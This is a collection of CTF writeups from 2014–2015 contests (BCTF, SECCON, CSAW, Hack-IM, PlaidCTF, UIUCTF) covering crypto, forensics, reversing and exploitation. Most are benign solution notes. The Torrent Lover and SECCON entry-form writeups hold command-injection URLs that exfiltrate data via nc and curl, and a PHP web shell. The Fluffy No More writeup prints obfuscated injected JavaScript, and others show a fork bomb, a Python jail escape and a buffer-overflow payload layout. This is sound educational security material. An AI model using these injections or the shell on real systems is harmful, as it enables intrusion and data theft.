<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-d4rwinb0ts
description: CTF writeups and security challenges by d4rwinb0ts.
---

# Writeups by d4rwinb0ts

Source repository: `/repos/d4rwinb0ts`

## Repository Index

- ctf-writeups/README.md
- ctf-writeups/2015-bctf/torrent_lover.md
- ctf-writeups/2015-bctf/weak_enc.md
- ctf-writeups/2015-seccon/entry_form_100.md
- ctf-writeups/2015-seccon/stego1_100.md
- ctf-writeups/2015-uiuctf/unoriginal.md
- ctf-writeups/2015-plaidctf/strength/README.md
- ctf-writeups/2015-hack-im/crypto_1/solution.md
- ctf-writeups/2015-hack-im/crypto_2/solution.md
- ctf-writeups/2015-hack-im/crypto_3/solution.md
- ctf-writeups/2015-hack-im/forensics_4/solution.md
- ctf-writeups/2015-hack-im/trivia_2/solution.md
- ctf-writeups/2015-hack-im/trivia_3/solution.md
- ctf-writeups/2015-hack-im/web_1/solution.md
- ctf-writeups/2014-csaw-quals/bo_exploit_100/solution.md
- ctf-writeups/2014-csaw-quals/dumpster_diving_forensics_100/solution.md
- ctf-writeups/2014-csaw-quals/eggshells_reversing_100/solution.md
- ctf-writeups/2014-csaw-quals/fluffy_no_more_300/solution.md
- ctf-writeups/2014-csaw-quals/obscurity_forensics_200/solution.md
- ctf-writeups/2014-csaw-quals/psifer_school_crypto_200/solution.md
- ctf-writeups/2014-csaw-quals/pybabbies_exploit_200/solution.md
- ctf-writeups/2014-csaw-quals/weissman_reversing_300/solution.md
- ctf-writeups/2014-csaw-quals/why_not_sftp_forensics_200/solution.md

## Writeup Content


### File: ctf-writeups/2015-plaidctf/strength/README.md

# Strength (Crypto, 110 pts)

Downloading the problem file, we see:

	{N, e, c}
	{<a 1024-bit number>, <a number>, <a number}
	{<a 1024-bit number>, <a number>, <a number}
	{<a 1024-bitnumber>, <a number>, <a number}
	... 20 sets ...

where `N` value is the same in every row. `N, e, c` and then suggest that this is a RSA cipher, with (N,e) being the public key and c being the ciphertext.

Remember that in RSA, `m**e == c (mod N)`. Since we have multiple values of `e` and `c` at our disposal, we can combine them to find other powers of `m`. Our goal is to find `m (mod N)`, which should be possible if two of the `e`'s we're given are relatively prime. I used factordb to factor all the exponents and found exactly one pair, 1804229351, 17249876309, which were relatively prime.

Now, because `gcd(e1, e2) == 1`, using the Extended Euclidean Formula, we can find the Bezout coefficients a, b that solve the following equation:

    a * e1 + b* b2 == 1

Note that if we take m the power of either side of the equation, we get:

    m ** ( a*e1 + b*e2) == m**1 (mod N)
    ..
    (m**e1)**a + (m**e2)**b == m (mod N)
    ..
    c1**a * c2**b == m (mod N)     # where c1, c2 are the given ciphertexts for e1, e2

As it turns out, a was negative, so we needed to calculate a modular inverse. The Chinese Remainder theorem provides us a solution:

    def invert(e, n):  # calculates e**-1 (mod n)
      t, nt, r, nr = 0, 1, n, e
      while nr:
        r, (q, nr) = nr, divmod(r, nr)
        t, nt = nt, t - q * nt
      return t % n

    invert(c1 ** (-a)) * c2 ** b == m

Full solution: [solve.py]



 



### File: ctf-writeups/README.md

# CTF Writeups

This repository contains solutions to various CTF problems solved by d4rwinb0ts. Find our team on [CTF
time](https://ctftime.org/team/8736).



### File: ctf-writeups/2014-csaw-quals/bo_exploit_100/solution.md

There’s literally a string “flag{exploitation_is_easy!}” you can see in Hopper for the given binary



### File: ctf-writeups/2014-csaw-quals/dumpster_diving_forensics_100/solution.md

Downloading the file and running strings:

```
strings firefox.mem | grep “flag{“
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
```



### File: ctf-writeups/2014-csaw-quals/eggshells_reversing_100/solution.md

# Eggshells (Reversing 100)

This first reversing problem was quite easy. First, we downloaded and unzipped the provided file.

```
$> ls -R egshells-master
capstone.py  distorm.py  interpreter.py  main.py  nasm  nasm.py  server.py  shellcode.py  utils.pyc  wrapper.py

./nasm:
LICENSE  nasm.exe  ndisasm.exe  rdoff

./nasm/rdoff:
ldrdf.exe  rdf2bin.exe  rdf2com.exe  rdf2ihx.exe  rdf2ith.exe  rdf2srec.exe  rdfdump.exe  rdflib.exe  rdx.exe
```

There are lot of files in here, but we immediately notice that we were given a compiled utils.pyc, while the rest
of the files in the root directory are regular python files. That seems like a good place to hide a flag. Let's run strings 
on it.

```
$> strings eggshells-master/utils.pyc
urllib2s
http://kchung.co/lol.pyN(
__import__t
urlopent
read(
/Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.pyt
<module>    
```

Now let's check out that file on kchung.co

```
$> curl http://kchung.co/lol.py
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

Lol, forkbomb. 

That was pretty easy.



### File: ctf-writeups/2014-csaw-quals/fluffy_no_more_300/solution.md

# Fluffy No More - Forensics 300

**Description:**

> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
> Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of its database and configuration. Figure out what is going on!
>
> Written by brad_anton

## Write-up

So in the auth log there’s some interesting stuff
```
Sep 17 19:18:11 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/log/apache2 ; USER=root ; COMMAND=/bin/mv access.log error.log other_vhosts_access.log /var/log/apache2/
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```

Diffing two versions of the changed file shows some added code

```
[12:30:23] $ diff ~/Downloads/CSAW2014-FluffyNoMore-v0.1/webroot/www/html/wp-content/themes/twentythirteen/js/html5.js ~/Downloads/CSAW2014-FluffyNoMore-v0.1/webroot/www/html/wp-content/themes/twentyfourteen/js/html5.js
8c8,9
< if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document); var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
---
```

Which means they are injecting a script tag to: ```http://128.238.66.100/analytics.js```
```
> if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document);
```

Loading the script ourselves, we are able to see this link to a pdf file.
```
http://128.238.66.100/announcement.pdf
```

That pdf had an embedded file in it.

Get this tool: http://blog.didierstevens.com/programs/pdf-tools/
```
./pdf-parser.py --object 8 --filter --raw announcement.pdf
```

That gives you:
```
obj 8 0
 Type: /EmbeddedFile
 Referencing: 
 Contains stream

  <<
    /Length 212
    /Type /EmbeddedFile
    /Filter /FlateDecode
    /Params
      <<
        /Size 495
        /Checksum <7f0104826bde58b80218635f639b50a9>
      >>
    /Subtype /application/pdf
  >>

 var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
```

Loading that variable into nodejs to decode:
```
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
```



### File: ctf-writeups/2014-csaw-quals/obscurity_forensics_200/solution.md

Open pdf file and do ctrl-a to select all. paste into notepad gives:

flag{security_through_obscurity}

So the text is hidden behind the image.



### File: ctf-writeups/2014-csaw-quals/psifer_school_crypto_200/solution.md

First round: gives you a caesar cipher.
```max tglpxk mh mabl lmtzx bl xtlrtltuv```
Decodes to:
```the answer to this stage is easyasabc```

Second round: Now it's time for something slightly more difficult. Hint, everybody knows it's not length that matters.
psifer text:
```
Io uota pbmi icln.thlbfr rg rriy vdeo  s yoT g reoyrfr  o srhe ro ft ui tnh aee py n varl ttshlg  odealsahfwdfoheo tobicp.hmipa ro fti"rawse"F ueosy lg oecln!heod'he oewhh aeeIsu  iytitoa  ua nlsfacrt eachsf ueossmene r.oyrfr,owleatrhlg.
```
this is a column cipher with variable width.

third level:
```
MVJJN BQXKF NCEPZ WWVSH YFCSV JEEBB UVRMX HKPIE PMMVZ FOPME ZQIIU EUZZW CGHMV BKBTZ BBHVR MVTQP ENXRM HIRNB WTGDZ CFEDS TKBBW HBFDI KILCM MUUPX WUNIN PWPFJ IEZTP MVQBX ACVKN AEMPV KQXAB ZMDUD ILISV NHKBJ FCIMW HTUVR MNNGU KIFED STLLX XAOUN YVEGV BEXEI BHJNI GHXFI FQFYV VXZFE FXFFH OBVXR MVNLT NHUYY FEZWD GBKEL SGFLM LXBFO NEIOS MZHML XAJUX EIKWH YNAIK SCCUA PTVPB HHAFC SVNXB MHPDU DILIS VNAEM WUZML SEJBS FXMLV PLFWT KCCRV ECCIT KJNXB BTFGX RNFTV LRVAM NVIKW HAFKB BRZAB ISAEW OMZNM PXZBD VEMMH MVFTQ UZJKN EIEON SGTVR VBUUE MMHMV FTQUK IFMXJ ESFQY PELKI ZNXEL GOFQB HHBUN UGXMC NREXX AWTYU KHXFU YUGMM BFVXL XHPFZ ZRSNJ FJIEZ XRBCI MSYGJ DJEIV FZGNH GAOMC YGKXG ZFOIV HPBSF REEFF RXRLT JFKBX GHRFR HWABZ MSLXI SSSZA AXMVS FOZLB HJWCM LXZQJ GHWMC GKBXT EOJEN XBMWT JNTXB QBKYT GACGK BXPXJ FCMBQ GCURG TWHQI ZMMXA SGLHG CMVJE ABWMV BKXXT XBEZH ZSGKI ZWAVT BEFGD IRMPL AXXMV BKJHI FAJXB MFXSY RWMPR HIVLB KAHPW ZLIMH PJOVG XGTWO EPRAP LHMEG OUKUV OPSMC MXIEW UKFXF BHNFL XPBHU CYUMM APIYM LXFF
```
vignere cipher, the one above has key TOBRUTE
since plaintext always starts the same, it is easy to reverse key for new challenges:

“Congratulations, you have solved stage 3. The flag is: flag{IGraduatedPsiferSchoolAndAllIGotWasThisLousyFlag}.”




### File: ctf-writeups/2014-csaw-quals/pybabbies_exploit_200/solution.md

# Pybabbies (Exploitation 200)
Another python jail problem. We can see from the source code that they removed all the builtins.

The solution:
```
print([x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'file'][0]('./key').read())
```



### File: ctf-writeups/2014-csaw-quals/weissman_reversing_300/solution.md

The file is a custom LZ-type compressed archive. byte ‘\x13’ divides the file into 9-byte chunks. You can re-use a
prefix of an existing chunk instead of a current chunk. a three-byte chunk encodes reusing a previous prefix. the first
7-bits are the length of the used chunk.

The first file is the HTML at http://burtleburtle.net/bob/hash/

Replacing each three byte chunk to encode a previous prefix with zeros of correct length and using the 9 byte chunks as
is gives a valid jpeg file for key.jpg. The image is corrupted/distorted, but opening in GIMP gives a good enough view
of the key part to recover:

The decompression code is in decompress.py

key{I know how long it’d take, and I can prove it}



### File: ctf-writeups/2014-csaw-quals/why_not_sftp_forensics_200/solution.md

Packet dump of FTP transfer of “files.zip”. 

* Using wireshark to extract bytes sent for each files.zip packet and concatenating gives the zip file. 
* Extract zip file to get flag.png, which is a picture of:
```
flag{91e02cd2b8621d0c05197f645668c5c4}
```



### File: ctf-writeups/2015-bctf/torrent_lover.md

Torrent Lover
-------------

In this problem, we were given a website with a form and the instructions: "input something(torrent)'s URL u wanna know here". If you entered a link with a torrent file, the website would direct you to a page where you could view metadata about the torrent. The server performed some kind of validation on the url you gave it. Entering a url with a space, or a url that didn't end in ".torrent" would give you an error message.

### Unsafe wget

First, I submitted a url that pointed to a torrentfile on a server I controlled. Looking at the user-agent in the request made, it was clear that the server was using the `wget` command to fetch my torrent file. If the server was in fact using wget to fetch the urls we provided, we could likely get it to execute arbitary commands. As a simple POC, I gave it this url:
```
http://<myserver>/`uname`.torrent
```
This caused the server to make a request to my server for `/Linux.torrent`.

We could also get the server to run other arbitrary commands by append a semicolon, followed by the command we wanted to run.

### Shellcode without spaces

The validation on the server caused our requests to fail if the url we supplied contained a space. No worries though, we can simply use the internal file separator to get around this restriction.

Giving it the url
```
http://<myserver>/somefile;echo${IFS}test|nc${IFS}<myserver>${IFS}9999;.torrent
```

And listening on my server:
```
nc -l 9999
```

Caused the game server to send me the word "test". This means we can run arbitrary commands on the server, and see the output.

### Find the flag

First things first, I used the `find` command to look for the flag on the server
```
http://<myserver>/somefile;find${IFS}/${IFS}-name${IFS}*flag*|nc${IFS}<myserver>${IFS}9999;.torrent
```

This revealed that there were `flag` and `use_me_to_read_flag` files in /var/ww/html/flag

Running the binary by submitting this url
```
http://<myserver>;/var/www/flag/use_me_to_read_flag${IFS}/var/www/flag/flag|nc${IFS}<myserver>${IFS}9999;.torrent
```
I see a message that says: `You do not have permission to access /var/www/flag/flag` Using `ls -al` to inspect the permissions, it appears that
the binary does have the proper permissions to read the flag. We probably want to grab the binary and inspect it locally.

### A small bit of reverse engineering
Command to grab the binary:

```
http://<myserver>/;cat${IFS}/var/www/flag/use_me_to_read_flag|nc${IFS}<myserver>${IFS}9999;.torrent
```

And on my server:
```
nc -l 9999 > out.bin
```

Binary get!

Using `file`, I determine that it is an ELF. I run `ltrace` on it:

```
echo "test" > flag
ltrace out.bin flag
```

From the output, I can see that the binary does a `strstr` to see if the argument I provided contains the substring 'flag'.

So we can't directly read the flag, but that's no big deal. We can just make a symlink to the flag.

```
ln -s flag different_name
./out.bin different_name
```
It works! Now let's do that on the server. I submit the following two urls:

```
http://<myserver>/;/ln${IFS}-s${IFS}/var/www/flag/flag${IFS}/tmp/asdf;.torrent
```
and
```
http://<myserver>/;/var/www/flag/use_me_to_read_flag${IFS}/tmp/asdf|nc${IFS}<myserver>${IFS}9999;.torrent
```

And the server spits out the flag:
```
BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}
```





### File: ctf-writeups/2015-bctf/weak_enc.md

Weak Enc
--------

In this problem, you are given a python encryption program that takes plaintext and returns an encrypted message.

###  Preliminary -- proof of work

A proof of work is required to prevent brute-force / ddosing the service. you have to find a string with a server-provided nonce as a prefix with a sha1 ending in \0\0. We can just bruteforce this:

    def solve_pow(prefix):
        for suffix in range(0,9999999):
           text = prefix + ('%5d' % hex(suffix))
               if hashlib.sha1(text).digest().endswith('\0\0'):
       	          return text

### The LZW function

    def LZW(s, lzwDict): # LZW written by NEWBIE
        for c in s: updateDict(c, lzwDict)
	result = []
	i = 0
        while i < len(s):
           if s[i:] in lzwDict:
              result.append(lzwDict[s[i:]])
              break
            for testEnd in range(i+2, len(s)+1):
               if not s[i:testEnd] in lzwDict:
                  updateDict(s[i:testEnd], lzwDict)
                  result.append(lzwDict[s[i:testEnd-1]])
                  i = testEnd - 2
                  break
            i += 1
        return result

The plaintext is concatenated to a secret salt, then run through a custom LZW algorithm. This then gets xor'ed with a fixed OTP derived from the MD5 of the salt. The LZW table is populated in order with single letters first, then dynamically during encoding as new sequences are found. This suggests that the plaintext "SALT$a", where "a" is any letter, will always encode to the same value as long as "a" is not in the salt, and when 'a' is in salt, the lzw value of a will reflect the first index of a in salt. 

The lzw results are then concatenated to an OTP. The specific value of this OTP I'm not terribly interested in, as we'll shortly see: The final results are the bytes in the lzw compression xor'ed with the bytes in the OTP.

### Eliminating the OTP, and finding the character encodings 

So now , we know enc(salt$s) = otp ^ lzw(salt$s), etc. and we know which letters are included in salt. this means we know that '$' gets encoded as byte N, where N is the number of unique letters in the salt. and thus if we encode 'salt$!', '!' gets encoded as byte N+1. thus, lzw(salt$s) = enc(salt$s) ^ enc(salt$!) ^ lzw(salt$!). we know that lzw(!) = N + 1, so we can get the numeric value of s for all characters s. Arranging them in order, we know the order of the first occurence of each letter in the salt.

### Finding ngrams

Now we know the encoding of each character. In the actual CTF, we got:

    n: 0
    i: 1
    k: 2
    o: 3

Bruteforceing the solution may still be difficult, so we should figure out a better solution. That is to check ngrams: for all plaintextx of the form salt${abcde}, 'abcde' will encode as a single byte when 'ab' actually appears as a bigram in the salt. 

    salt$ni = 4
    salt$ik = 5
    salt$ko = 6
    salt$on = 7
    salt$nik = 8
    salt$kon = 9
    salt$nin = 10
    ...
Following along the lzw process on paper, we find the salt is "nikonikoninikonikoni" based on the order of the bigrams as it is being lzw-compressed:

    n    ni = 4
    i    ik = 5
    k    ko = 6
    o    on = 7
    ni   nik = 8
    ko   kon = 9
    ni   nin = 10
    nik  niko = 11
    on   oni = 12
    ik   iko = 13
    oni  oni$ = 14

### Decrypting the solution

The message we were asked to decrypt was: NxQ1NDMYcDcw53gVHzI7. Since we know the salt, we can calculate the OTP and xor it against the decrypted message to retrieve lzw(solution). This turns out to be 
0,1,2,3,4,6,4,8,7,5,12,11,10,13,4 which we look up in our lzw table generated from the previous solution:

    nikonikoninikonikoni nikoninikoni



Full solution file: https://gist.github.com/talyian/e4c136466628aa41873a



### File: ctf-writeups/2015-hack-im/crypto_1/solution.md

# Crypto 1

**Question**
>Find the key: 
>TaPoGeTaBiGePoHfTmGeYbAtPtHoPoTaAuPtGeAuYbGeBiHoTaTmPtHoTmGePoAuGeErTaBiHoAuRnTmPbGePoHfTmGeTmRaTaBiPoTmPtHoTmGeAuYbGeTbGeLuTmPtTmPbTbOsGePbTmTaLuPtGeAuYbGeAuPbErTmPbGeTaPtGePtTbPoAtPbTmGeTbPtErGePoAuGeYbTaPtErGePoHfTmGeHoTbAtBiTmBiGeLuAuRnTmPbPtTaPtLuGePoHfTaBiGeAuPbErTmPbPdGeTbPtErGePoHfTaBiGePbTmYbTmPbBiGeTaPtGeTmTlAtTbOsGeIrTmTbBiAtPbTmGePoAuGePoHfTmGePbTmOsTbPoTaAuPtBiGeAuYbGeIrTbPtGeRhGeBiAuHoTaTbOsGeTbPtErGeHgAuOsTaPoTaHoTbOsGeRhGeTbPtErGePoAuGePoHfTmGeTmPtPoTaPbTmGeAtPtTaRnTmPbBiTmGeTbBiGeTbGeFrHfAuOsTmPd

## Write-up
Converting each of these elements to thier atomic number, then to ascii gives you a quote. That wasn't the flag though. The problem said "find the key", and the key we used to decode this string was the periodic table.

The flag was "periodic table".



### File: ctf-writeups/2015-hack-im/crypto_2/solution.md

# Crypto 2

**Question**
> A message has been intercepted from Alice to Bob. Decode and find the flag.

> Message:
> 11313221111241132131614122141231311261112124131111132131623212141221322111131312141321222141621211124114212162114241131222211121623122211112211112133162321214121211135321221412121112112113221221111221416231242121613111131222211121124163221214216352123221111241132212211121621322141311322111216241121322214163111113221221112163113211422111216213222111131321623212141221322111231131721142123213221142312262131221112222221111222212411222322132221221322111123222311221112211421322312211423122111112312231222143212221322221135111211111321142411213221112132221126111215112123211211232122111

## Write-up
The distribution is non-uniform: 5,6,7s appear very rarely and 1,2 are most common. This suggests run length encoding.

Check out solve.py, which decodes the message: 
>Dear Bob,
>Our codeword may have been compromised by Eve, so please note and use the new code: 4674107e353af23dec1e471415bbd923.
>Thanks,
>Alice



### File: ctf-writeups/2015-hack-im/crypto_3/solution.md

# Crypto 3

**Question**
> Server running at: 54.165.191.231:2002

> >netcat 54.154.191.231                                                                                       
> M E N U
> 1. Show public keys
> 2. Encrypt
> 3. Solve challenge
> What do you want to do: 1
> Public Key(N): 22707716705395385903017779098328224417
> 
> M E N U                                                                                
> 1. Show public keys                                                                    
> 2. Encrypt                                                                             
> 3. Solve challenge                                                                     
> What do you want to do: 2                                                              
> Enter string to encrypt: the eagle has landed                                          
> Cryptogram C = M^2 % N: [16706375071175492792039878978962223285, 856516745787598793104]
                                                                                                                                      
## Write-up

The server tells you the cypher is obtained by finding the square of the plaintext mod N. This is a Rabin cipher, 
which relies on the difficulty of calculating the square root modulo a large semiprime (N) unless the factors of that prime are known.

Luckily, the size of this key, 22707716705395385903017779098328224417, is only O(2^124) -- which is easily factored using a general number field sieve.

I used msieve to factor this: 

> > msieve -q 22707716705395385903017779098328224417
> 22707716705395385903017779098328224417
> prp19: 4085722380312421477
> prp19: 5557821748931214221

M E N U
1. Show public keys
2. Encrypt
3. Solve challenge
What do you want to do: Decrypt:
[11193203926281936610602741358557902742, 866255063186730425674749972562607224, 757076103014098105015915072375696]

After playing around with encrypting my own messages, I verified that the encrypted message was formatted as digits mod N, 
so I just ran that through a decryption.

    def decrypt(cypher):
        return it.product(*list(decrypt(cypher)))

    def _decrypt(cypher):
        for c in cypher:
	    # mod_sqrt equivalent to http://ideone.com/r7BAX
            mp = mod_sqrt(c, p)
            mq = mod_sqrt(c, q)
            yp, yq = gcd(p, q)
            r = (yp*p*mq + yq*q*mp) % self.N
            s = (yp*p*mq - yq*q*mp) % self.N
            yield [r, N-r, s, N-s]

This yields 4 candidate answers per digit block (so 64 total combinations), but when we decode the base-N numbers to base 256,  
there is only one valid answer that decodes to only printable characters:

> Rabin(4085722380312421477, 5557821748931214221).solve([
     11193203926281936610602741358557902742,
     866255063186730425674749972562607224,
     757076103014098105015915072375696])
> opopanax judge kalansuwa modernization



### File: ctf-writeups/2015-hack-im/forensics_4/solution.md

# Forensics 4

**Question**
> This image contains a pagefile. Can you tell the size of it (in bytes)? 
> Password to open archive:Synergy@123
> Flag format: flag{flag} 

## Write-up
Seemed too easy... Pulled the core file out of the .rar file, used strings on it and saw:
PagefileSize: 0x7ff7e000

Converted to decimal: 2146951168.

Flag was `flag{2146951168}`



### File: ctf-writeups/2015-hack-im/trivia_2/solution.md

# Trivia 2

**Question**

>Image represents a randomness from the last night. Help us find the flag hidden behind.
>Trivia-200.png

## Write-up
It’s just a randomly shifted figlet image.

The last two characters are the same. The first one looks like a 1. The entire string appears to be 8 characters long.

Assume that the first row is aligned properly. This is actually pretty important to solving the final string, and we can eliminate all lowercase letters from the sequence.  

Writing a script to interactively shift the lines, we can see the text. The flag is 13378055



### File: ctf-writeups/2015-hack-im/trivia_3/solution.md

# Trivia 3

**Question**
> What is the version of Sharepoint running on an US based server with following details:
> ServerName: CEI02 
> Instance Name: Sharepoint. ?

## Write-up
Used SHODAN to find the device. Answer: 10.50.2500.0



### File: ctf-writeups/2015-hack-im/web_1/solution.md

# Web 1

**Question**
>To Err is human! 
>An error may not always be an indication of something wrong, but can be the stepping stone of success. 
>Flag format: flag{flag}

## Write-up

The error text is deterministic based upon your IP of origin: http://54.165.191.231/ToErrisHuman.php starts with “Tn”, then continues to print characters two per request. This is clearly either a file or the key itself.

The full sequence is: TnVsbGNvbkdvYTIwMTVAV0VCMDAxMTAw. It’s Base64. Here’s what it decodes to: NullconGoa2015@WEB001100.

The flag was: `flag{NullconGoa2015@WEB001100}`



### File: ctf-writeups/2015-seccon/entry_form_100.md

Entry form
----------

Another pretty easy problem. We are given a link to a form where we can enter a username and email. After submitting the form the page says "Your entry was sent". Not very much going on here.

The page is a cgi script, and is probably injectable.

We take a look at the root of the web server (http://entryform.pwn.seccon.jp), and notice that it is shows the directory structure. From there we find the file `register.cgi_bak`, apparently the source code for the entry form:


Here is the most interesting part of that file:
```
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);
  
  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);
```

The `open` call runs commands by concatinating a string with user input. We can add a single quote to the `mail` query string argument, then inject arbitrary commands. Here is a url that runs the ls command, and sends the output to a server we control.
```
http://entryform.pwn.seccon.jp/register.cgi?mail=%27`curl%20<my server>:9999/%20--data%20%22$(ls)%22`%27&name=asdf&action=Send
```
*Note: I used `curl -d` to send the results of the commands I ran to a server I controlled, but apparently that was not needed; you could just run the commandand the results would show up in the page.*

Either way, next we try to run `cat log`, but this does not work because the user we are running commands as only has write permissions to that file.

Conveniently, we find a script `backdoor123.php` under the `SECRETS` directory on the web server. It provides a way around this issue:
```
<pre><?php system($_GET['cmd']); ?></pre>
```

From there, we simple run `head` to get the flag out of the log file.

The final url:
```
http://entryform.pwn.seccon.jp/SECRETS/backdoor123.php?cmd=head%20-n3%20../log
```

And the flag: SECCON{Glory_will_shine_on_you.}



### File: ctf-writeups/2015-seccon/stego1_100.md

Stego 1
-------

A really easy problem, we are given the file: MrFusion.gpjb

As with all stego files, I start by using hachoir-subfiles, which indicates that there are
many subfiles in this file.

To extract them:
```
hachoir-subfile MrFusion.gpjb subfiles/

```

Looking through the subfiles directory, we see a bunch of different
types of image files. Each image contains part of the flag. Inspecting
them individually, we are able to make the flag: SECCON{0CT 21 2015 078},
which is a reference to Back to the Future.



### File: ctf-writeups/2015-uiuctf/unoriginal.md

# Unoriginal (RE, 100 pts)

In this challenge we're given a binary and asked to exploit it. Analyzing the binary, it turns out to be very simple:

    void func() {
	    char buf[17];
	    read(stdin, buf, 256);
	}

    int main() {
	    puts("Hack the planet!");
		func();
		return 0;
    }

So obviously, this is a stack buffer overflow. Now, all we have to do is to inject some shellcode and overwrite the return in func(), right? Well as the following stack diagram shows, if we input more than 17 chars, the next 4 bytes correspond to a memory address we can jump to directly. If only we knew the exact address of the top of the stack right now, we could simply write [17 bytes padding] [ptr to shellcode] [shellcode] and get a shell. 

    void func() {
        char buf[17]; 
        read(...)   <-- break here
    }

    Stack layout:

	+---+----
	|???| [17 bytes for buf]
	|???| [return_ptr from func back to main()]
	|???| ... [main local variables]
	|???| [return_ptr from main back to _libc_start_main]

However, I wasn't sure how to locate the position of the stack in memory. So I decided to write to a fixed memory location in the .dynamic segment, by returning to a call to read(): This means our first 256 bytes will contain a return-to-read@plt address, then 3 arguments for the read. when read is called, 21 bytes will be read from stdin.

After reading these 256 bytes and overwriting func()'s return address, execution will have passed from `func` to `read@plt`. So, after the first 256 bytes, we will pass in exactly 21 bytes of shellcode to be read by that call to read(). After reading these 21 bytes, execution will pop over to our next stack address, which exexcutes our shellcode, resulting in a call to `execve("/bin/sh", 0, 0)`.

At this point, all input will be handled by `sh`, so we can start issuing commands directly to stdout, such as enumerating the user files with `find /home`.

    [17 bytes]     padding
	0x80482f0      address of read@plt
	0x8049640      static memory to write to; this is located in the .dynamic segment. execution will return to here after read() exits
	0              first arg to read: stdin
	0x8049640      second arg to read: location to read to
	21             third arg to read: number of bytes
	[padding]      pad out to 256 bytes
	[shellcode]   
	"find /home\n"
	"cat /home/asdf/flag.txt"

Note that I send some instructions directly to stdout; we could also easily set up a command loop with something like `while True: stdout.write(raw_input()); stdout.flush();`. Either way, we find that there exists `/home/asdf/flag.txt`, so issuing the command `cat /home/asdf/flag.txt` gets us the flag `flag{youtube.com/watch?v=YBm962rQ9XI}`

	/home
	/home/asdf.tar.gz
	/home/ubuntu
	/home/ubuntu/.bashrc
	/home/ubuntu/.bash_logout
	/home/ubuntu/.ssh
	find: `/home/ubuntu/.ssh': Permission denied
	/home/ubuntu/.cache
	find: `/home/ubuntu/.cache': Permission denied
	/home/ubuntu/.profile
	/home/ubuntu/.bash_history
	/home/ubuntu/.viminfo
	/home/asdf
	/home/asdf/.bashrc
	/home/asdf/.bash_logout
	/home/asdf/flag.txt
	/home/asdf/.profile
	/home/asdf/unoriginal
	/home/asdf/pwn_serv.conf
	/home/asdf/.bash_history
	/home/asdf/.viminfo
	flag{youtube.com/watch?v=YBm962rQ9XI}

[Full Solution](unoriginal.py)

